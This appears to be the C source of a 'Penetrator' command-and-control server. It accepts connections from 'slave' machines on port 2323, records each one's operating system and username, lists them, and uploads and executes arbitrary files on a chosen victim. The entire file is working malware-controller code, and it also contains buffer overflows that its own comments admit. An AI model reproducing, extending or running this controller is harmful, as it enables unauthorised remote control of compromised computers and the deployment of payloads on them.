#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
pthread_mutex_t mutex1 = PTHREAD_MUTEX_INITIALIZER;//This mutex is used to prevent threads from using the linked list at the same time!

//Struc which will be used for tha slaves linked list!
struct slave
{
	int ID;//Every slave has a spesific id which helping us to reference to it!
	int sockd;//Every slave has his own socket which helping us to send a recv data to it !
	char *info;//Operating system,username/computername of the spesific slave!
	struct sockaddr_in addr;//IP address, port number of the spesific slave!
	struct slave *next; // Pointer to the next slave in the linked list !
};
struct slave *list_head = NULL; //A pointer to the first onject-node of the linked list!


		//pthread_mutex_lock(&mutex1);
		
		//pthread_mutex_unlock(&mutex1);
			
//Functions
int my_check(char *tocmp,char *word,int size)
;
char *my_recv(int *socket);
int lis_accept(void *arg);
void list_slaves();
void upload(int ag);
int my_send(int *socket,char *buffer,int size);
int upload_execute(int no);
int main ()

{
        
	pthread_t thread1;	
       
	char input[10];
	printf("Welcome to Penetrator!\n");
	printf("Press 'help' for more options\n");

	while(strcmp(input,"exit") != 0)
	{
		printf("Command~:");
		scanf("%s",input);  //it has an overflow !
		if (strcmp(input,"clear") == 0)
			system("clear");
		else if(strcmp(input,"listen") == 0)
			//lis_accept();
			pthread_create(&thread1,NULL,(void *)&lis_accept,NULL);			
		else if(strcmp(input,"slaves") == 0)
			list_slaves();
		else if(strcmp(input,"up_ex") == 0)
		{
			int ag=0;
			printf("No:");
			scanf("%d",&ag);
			upload_execute(ag);				
		}
		
            
        }
	printf("Goodbye!\n");


	return 0;
}

//lis_accept function starts as thread ,creates a socket ,bind ,and accept !
int lis_accept(void *arg)
{
	int sock = 0,soc = 0,ids =0;
	struct sockaddr_in me, slave;
	socklen_t ssize = sizeof(struct sockaddr_in);
	
	memset(&me,0,sizeof(struct  sockaddr_in));
	me.sin_family = AF_INET;
	me.sin_port = htons(2323);
	me.sin_addr.s_addr = INADDR_ANY;

	
	if ((sock = socket(AF_INET,SOCK_STREAM,0)) == -1 )
	{
                printf("Failed to create a Socket!\n");
		return 0;
	}
	else
		printf("Socket created!\n");
	
	if (bind(sock,(struct sockaddr*)&me,sizeof(struct sockaddr_in)) == -1)
	{
		printf("Failed to bind the socket!\n");
		perror("bind");
		return 0;
	}
	else
		printf("Bind Successful!\n");

	if (listen(sock,10) == -1)
	{
		printf("Failed to mark the Socket\n");
		return 0; 	
	}
	else
		printf("Mark Successful!\n");
	
	printf("Listening Started !\n");
	/* Whenever a slave is connected a new node in the linked list is created  and the fields of the node take the information of the slave!.*/
	while((soc =accept(sock,(struct sockaddr*)&slave,&ssize)) != -1)
	{
                pthread_mutex_lock(&mutex1);

		printf("\nSlave Connected!\n");
		
		struct slave *new = (struct slave*)malloc(sizeof(struct slave));
		
		new->sockd = soc;
		
		new->info = my_recv(&new->sockd);
		
                if (new->info == NULL)
                    free(new);
                else
                {
                    ids++;
                    new->ID = ids;
                    new->addr = slave;
                    new->next = list_head;
                    list_head = new;
                }
		pthread_mutex_unlock(&mutex1);
	}
	
	
		
	return 0;	
}

//list_slaves starts from the first node and prints information for every slave until to reach the last node in linked list! 
void list_slaves()
{		
        pthread_mutex_lock(&mutex1);
		
	struct slave *ctl = list_head;
	while(ctl!=NULL)
	{
                printf("No.%d  ||  %s:%d  ||  %s\n",ctl->ID,inet_ntoa(ctl->addr.sin_addr),ntohs(ctl->addr.sin_port),ctl->info);
		
		ctl = ctl->next;
	}
	
        pthread_mutex_unlock(&mutex1);
}


void upload (int target)
{
        char p[300];
        scanf("%s",p);
	int i=0;
	struct slave *targ = list_head;
	while(targ!=NULL)
	{	
		if (targ->ID == target)
			my_send(&targ->sockd,p,strlen(p)+1);
		targ= targ->next;
	}
	

}
/*We know that the receive calls normally return any data available, up  to  the requested amount, rather than waiting for receipt of the full amount requested.From this we understand that if we are going to receive 400 bytes and for some reason (like slow internet or something that will cause delay) we get 300 bytes and some seconds later another 100 bytes, the recv function will save the first received bytes(300bytes) to our allocated buffer , she will end successfully and she will return  the number of bytes received.We took 300 bytes and another 100 bytes remaining  in the socket buffer ! 'my_recv' function verify how much bytes is going to receive in a spesific socket and ensures that all of them they will come successfully! 'my_recv' returns a pointer to a buffer which it holds the received bytes!*/
char *my_recv(int *socket)
{
        /*This while loop trying to receive 4 bytes which they indentify the actual bytes that we are going to receive and she stops when the requested amount of bytes(4 bytes), has been 
	received! */
	int bytesneeded = 4;//Requested amount of bytes!Whenever we receive bytes that are smaller than the requested amount,bytesneeded holds the remaining bytes which they will be requested at the next recv call !
	int bytes =0;//Amount of bytes per recv call!
        int recvdbytes = 0;//Total received bytes !
	char *buffer; //Receives the bytes that the second while loop will save !
	char num[4]; //Receives the number of bytes in a form of "0000" !
	int size =0; // The num[4] buffer is converted to int and saved here !
	char *bufferpoint = num; //The initialized variable has the address from the first position of the buffer which it is going to receive the requested amount of bytes!Whenever we accept bytes that are smaller than the requested bytes , bufferpoint contains the address from the next of the last byte position in the buffer .So now the next recv on the remaining bytes will save the bytes in the order which they came!
	while(1)
	{
		
		bytes = recv(*socket,bufferpoint,bytesneeded,0);

		if (bytes == -1 || bytes == 0)
                {
			printf("Failed to receive the size!\n");
			return NULL;		
		}
		
		recvdbytes = recvdbytes + bytes;
		if (recvdbytes<4)
		{
			bufferpoint = &num[recvdbytes];
			bytesneeded = bytesneeded -bytes;
		}
		else
			break;
		
	}
	/*At the end of the first while loop without errors we shut agreement for the size of  bytes that we are going to receive.This size is saved to 'size' variable. The following while loop does exaclty the same thing with the first but she differs in 3 things 1.the requested amount size (bytesneeded) 2.the allocated buffer which receives the bytes(buffer) 3.the buffer pointer (bufferpoint) which now it points to the first position of the allocated buffer*/
	size = atoi(num);
	bytesneeded = size;
	buffer = (char*)malloc(size);
	bufferpoint = buffer;
	recvdbytes = 0;
	//printf("Preparing to recieve %d bytes!\n",size);
	while(1)
	{
		
		bytes = recv(*socket,bufferpoint,bytesneeded,0);
		if (bytes == -1 || bytes == 0)
		{
			printf("Failed to receive the bytes!\n");
			return NULL;		
		}
		
		recvdbytes = recvdbytes + bytes;
		if (recvdbytes<size)
		{
			bufferpoint = &buffer[recvdbytes];
			bytesneeded = bytesneeded -bytes;
		}
		else
			break;
		
	}
	//printf("Done!!\n");
	return buffer;
}


/*my_send function indentifies how much digits there is in the size variable ,subtracts them from the max digit size(in this case 4) in order to find the correct position in the num buffer.If we get size 34 num will be 0034. Subsequently it sends these 4 bytes in order to warning the receiver about how much bytes he prepares to send. In the end she sends the buffer with the agreed size */
int my_send(int *socket,char *buffer,int size)
{
        char num[5]= {'0','0','0','0','\0'};
        int quotient =size;
        int digits=0;
        while(quotient!=0)
        {
                quotient = quotient / 10;
                digits++;
        }
        if (digits > 4)
        {
                printf("Error, max size 9999\n");
                return 0;
        }
        
        snprintf(&num[4-digits], digits+1, "%d", size);
        
        if (send(*socket,num,4,MSG_NOSIGNAL)!= 4)
        {
                printf("Failed to send the size. Possible reason: slave disconnected\n");
                return 0;
        }
        printf("Preparing to send %d bytes\n",size);
        if (send(*socket,buffer,size,MSG_NOSIGNAL)!= size)
        {
                printf("Failed to send the bytes. Possible reason: slave disconnected\n");
                return 0;
        }
        printf("Done!!\n");
        return 1;
}
int upload_execute(int no)
{
        int filesize = 0;
        char *filebytes;
        char *answer;
        int i=0;
        struct slave *targ = list_head;
        while(targ!=NULL)
	{	
		if (targ->ID == no)
                {
                        char path[256];
                        char exten[8];
                        printf("Enter file path:");//overflows scanf
                        scanf("%s",path);
                        printf("Extension:");
                        scanf("%s",exten);
                        FILE *fp = fopen(path,"rb");
                        if (fp == NULL)
                        {
                                printf("Error at file open!\n");
                                return 0;
                        }
                        fseek(fp,0,SEEK_END);
                        filesize = ftell(fp);
                        fseek(fp,0,SEEK_SET);
                        filebytes = (char*)malloc(filesize);
                        for(i=0;i<filesize;i++)
                        {
                                filebytes[i] = fgetc(fp);
                        }
                        fclose(fp);
                        if (my_send(&targ->sockd,"[file]\0",7) == 0)
                            return 0;
                        if (my_send(&targ->sockd,exten,strlen(exten)+1) == 0)
                            return 0;
                        if (my_send(&targ->sockd,filebytes,filesize) == 0)
                            return 0;
                        answer =my_recv(&targ->sockd);
                        if (answer == NULL)
                            return 0;
                        if (my_check(answer,"Error",5) == 1)
                        {
                            printf("Upload error!\n");
                            return 0;
                        }
                        else if (my_check(answer,"errorex",7) == 1)
                        {
                            printf("Execute error!\n");
                            return 0;
                        }
                        printf("Succes!\n");
                        return 1;
			
                }
		targ= targ->next;
	}
        
       
	return 1;
}

int my_check(char *tocmp,char *word,int size)
{
	int i =0;
	for(i=0;i<size;i++)
	{
		if (word[i]!=tocmp[i])
			return 0;
	}
	return 1;
}